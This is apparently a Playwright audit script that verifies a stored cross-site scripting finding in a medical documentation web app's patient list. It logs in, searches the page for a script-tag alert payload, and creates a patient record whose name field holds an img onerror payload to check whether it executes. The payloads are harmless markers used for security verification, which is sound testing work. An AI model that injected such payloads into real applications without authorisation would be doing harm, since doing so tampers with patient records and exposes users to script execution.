// Verify the XSS finding rigorously: load /patients, inspect DOM, check if
// the script actually executes (alert dialog), and capture html.

import { chromium } from '/opt/meddoc-pro/node_modules/@playwright/test/index.mjs';
import * as fs from 'node:fs';

const EV = '/opt/meddoc-pro/audit-evidence/app-deep-hunt';

const browser = await chromium.launch();
const ctx = await browser.newContext({
  baseURL: 'https://app.quillmd.com',
  viewport: { width: 1280, height: 900 },
});
const page = await ctx.newPage();

let alertFired = false;
page.on('dialog', async (dlg) => {
  alertFired = true;
  console.log('!! DIALOG:', dlg.type(), dlg.message());
  await dlg.dismiss();
});
page.on('pageerror', (e) => console.log('PAGE ERROR:', e.message.slice(0, 300)));

await page.goto('/login');
await page.getByLabel(/email/i).fill(process.env.TEST_APP_EMAIL);
await page.getByLabel(/password/i).fill(process.env.TEST_APP_PASSWORD);
await page.getByRole('button', { name: /sign in/i }).click();
await page.waitForURL(/\/dashboard/, { timeout: 15000 });

// Pull current patient list to find the XSS payload
await page.goto('/patients', { waitUntil: 'networkidle' });
await page.waitForTimeout(1500);
await page.screenshot({ path: `${EV}/screenshots/07-patients-with-xss.png`, fullPage: true });

const html = await page.content();
fs.writeFileSync(`${EV}/logs/07-patients-html.html`, html);

// Search for the literal `<script>alert(1)</script>` in HTML
const literalCount = (html.match(/<script>alert\(1\)<\/script>/g) || []).length;
const escapedCount = (
  html.match(/&lt;script&gt;alert\(1\)&lt;\/script&gt;/g) || []
).length;
console.log(`Literal <script>alert(1)</script> count: ${literalCount}`);
console.log(`Escaped &lt;script&gt; count: ${escapedCount}`);
console.log(`alert dialog fired: ${alertFired}`);

// Detailed: where did the script tag end up?
const scriptDetails = await page.evaluate(() => {
  return Array.from(document.querySelectorAll('script'))
    .map((s) => ({
      src: s.src ? s.src.slice(0, 80) : null,
      textHas418: /alert\(1\)/.test(s.textContent ?? ''),
      textPreview: (s.textContent ?? '').slice(0, 150),
      parentTag: s.parentElement?.tagName,
      inBody: !!s.closest('body'),
    }))
    .filter((x) => x.textHas418);
});
console.log('Script tags matching /alert(1)/:', JSON.stringify(scriptDetails, null, 2));

// Try another payload — img onerror — does it execute?
const imgTest = await page.evaluate(async () => {
  let imgError = false;
  const r = await fetch('/api/patients', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      name: '<img src=x onerror="window.__IMG_XSS=true">',
      dateOfBirth: '1991-06-06',
    }),
  });
  return { status: r.status, body: (await r.text()).slice(0, 300) };
});
console.log('img-payload create:', imgTest.status);
await page.goto('/patients', { waitUntil: 'networkidle' });
await page.waitForTimeout(1500);
const imgFlag = await page.evaluate(() => window.__IMG_XSS === true);
console.log('window.__IMG_XSS after rendering img onerror:', imgFlag);

await page.screenshot({ path: `${EV}/screenshots/07-patients-with-img-xss.png`, fullPage: true });

// Final flags
console.log('\n=== SUMMARY ===');
console.log(`alert(1) dialog fired: ${alertFired}`);
console.log(`window.__IMG_XSS executed: ${imgFlag}`);
console.log(`literal <script> tags in HTML: ${literalCount}`);
console.log(`escaped &lt;script&gt; in HTML: ${escapedCount}`);

await browser.close();
